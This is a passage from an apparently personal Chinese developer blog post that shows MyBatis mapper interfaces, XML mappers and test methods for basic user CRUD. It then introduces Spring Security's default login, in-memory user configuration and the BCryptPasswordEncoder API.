class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.dao.UserMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserlist<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select * from user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--补充一个getuserbyid的select标签--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserbyid<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">User</span> user <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>      sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">getuserlist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//根据ID返回数据</span>    <span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//添加用户</span>    <span class="token class-name">Boolean</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.dao.UserMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserlist<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--补充一个getuserbyid的select标签--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserbyid<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>adduser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        insert into mybatis.user(id,name,pwd) values(#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;);    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Boolean</span> adduser <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">adduser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"Boogipop2"</span><span class="token punctuation">,</span> <span class="token string">"2662501"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>adduser<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"添加成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    sqlSession<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//提交事务，是必须的，否则不会添加</span>    sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">getuserlist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//根据ID返回数据</span>    <span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//添加用户</span>    <span class="token class-name">Boolean</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//删除用户</span>    <span class="token class-name">Boolean</span> <span class="token function">deluser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.dao.UserMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserlist<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--补充一个getuserbyid的select标签--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserbyid<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>adduser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        insert into mybatis.user(id,name,pwd) values(#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;);    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delete</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>deluser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        delete from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>delete</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deluser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Boolean</span> deluser<span class="token operator">=</span>mapper<span class="token punctuation">.</span><span class="token function">deluser</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>deluser<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"删除成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      sqlSession<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//提交事务</span>      sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">getuserlist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//根据ID返回数据</span>    <span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//添加用户</span>    <span class="token class-name">Boolean</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//删除用户</span>    <span class="token class-name">Boolean</span> <span class="token function">deluser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//更新用户</span>    <span class="token class-name">Boolean</span> <span class="token function">cguser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>update</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cguser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       update user set name=#&#123;name&#125;,pwd=#&#123;pwd&#125; where id=#&#123;id&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>update</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cguser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">Boolean</span> cguser<span class="token operator">=</span>mapper<span class="token punctuation">.</span><span class="token function">cguser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"Kino2!"</span><span class="token punctuation">,</span><span class="token string">"asdasdasd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>cguser<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"更新成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       sqlSession<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//提交事务</span>       sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="SpringSecurity"><a href="#SpringSecurity" class="headerlink" title="SpringSecurity"></a>SpringSecurity</h2><p>参考：<a href="https://www.cnblogs.com/lenve/p/11242055.html">https://www.cnblogs.com/lenve/p/11242055.html</a></p><blockquote><p>SpringSecurity 是在java开发中很常用的一个库，用于身份验证、授权和安全性等功能上</p></blockquote><p><img src="/blog/2024/06/28/SpringBoot/image-20240714234715229.png" alt="image-20240714234715229"></p><p>创建一个新项目，导入Spring Security的依赖</p><p>然后写一个普通的控制器</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715000538588.png" alt="image-20240715000538588"></p><p>正常情况下我们直接访问&#x2F;hello就能进入HelloController</p><p>但是这边我们引入了Spring Security，当我们尝试访问&#x2F;hello的时候就会直接跳转到Spring Security自带的&#x2F;login</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240714235440408.png" alt="image-20240714235440408"></p><p>为了登录进去，我们需要知道用户名密码，spring security 默认的用户名是<code>user</code>，spring security启动的时候会生成默认密码（在启动日志中可以看到）</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715000601331.png" alt="image-20240715000601331"></p><p>这里是<code>890068b6-eb15-424a-a100-5df9b11cbdbc</code></p><p>输入错误的话会返回<code>Bad credentials</code></p><p>登录后就会302跳转到原来要访问的路由</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715000646480.png" alt="image-20240715000646480"></p><h3 id="账密配置"><a href="#账密配置" class="headerlink" title="账密配置"></a>账密配置</h3><p>这个登录的密码是随机生成的，每次启动时都会变。对登录的用户名&#x2F;密码进行配置，有三种不同的方式：</p><ul><li><p><strong>在 application.properties 中进行配置</strong></p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.security.user.name</span><span class="token punctuation">=</span><span class="token value attr-value">gbc</span><span class="token key attr-name">sprint.security.user.roles</span><span class="token punctuation">=</span><span class="token value attr-value">admin</span><span class="token key attr-name">spring.security.user.password</span><span class="token punctuation">=</span><span class="token value attr-value">486</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个方法貌似只能设置一个用户</p></li><li><p><strong>通过 Java 代码配置在内存中</strong>：即硬编码</p><p>创建一个 Spring Security 的配置类，继承自 <code>WebSecurityConfigurerAdapter</code> 类，但是因为CVE-2022-22978，Spring Security 5.7（Springboot3后）及之后的版本中<code>WebSecurityConfigurerAdapter</code>被弃用了，要使用的话springboot版本得回退到2.x</p><p>于是我们回退到2.x版本，创建SecurityConfig</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecuritydemo<span class="token punctuation">.</span></span><span class="token class-name">Config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">AuthenticationManagerBuilder</span> auth<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//下面这两行配置表示在内存中配置了两个用户</span>        auth<span class="token punctuation">.</span><span class="token function">inMemoryAuthentication</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"gbc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"nina"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token class-name">PasswordEncoder</span> <span class="token function">passwordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们在 configure 方法中配置了两个用户，用户的密码都是Bcrypt加密之后的字符串(明文是 123)</p><p>（从 Spring5 开始，强制要求密码要加密，如果非不想加密，可以使用一个过期的 PasswordEncoder 的实例 <code>NoOpPasswordEncoder</code>）</p></li><li><p><strong>通过 Java 从数据库中加载</strong>：咕了，不想碰数据库</p></li></ul><h4 id="BCryptPasswordEncoder"><a href="#BCryptPasswordEncoder" class="headerlink" title="BCryptPasswordEncoder"></a>BCryptPasswordEncoder</h4><p>BCrypt可以对密码做慢散列，然后存储。</p><p>BCryptVersion 有多个版本：$2a、$2y、$2b（见 BCryptVersion枚举类），默认$2a。</p><p>BCrypt密码强度：4~31，还可以设置一个随机数字——用于加盐，默认10。</p><p>BCryptPasswordEncoder的构造函数签名：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token keyword">int</span> strength<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">,</span> <span class="token class-name">SecureRandom</span> random<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token keyword">int</span> strength<span class="token punctuation">,</span> <span class="token class-name">SecureRandom</span> random<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">,</span> <span class="token keyword">int</span> strength<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">,</span> <span class="token keyword">int</span> strength<span class="token punctuation">,</span> <span class="token class-name">SecureRandom</span> random<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对密码做散列后的值：</p><pre class="line-numbers language-none"><code class="language-none"># 强度为 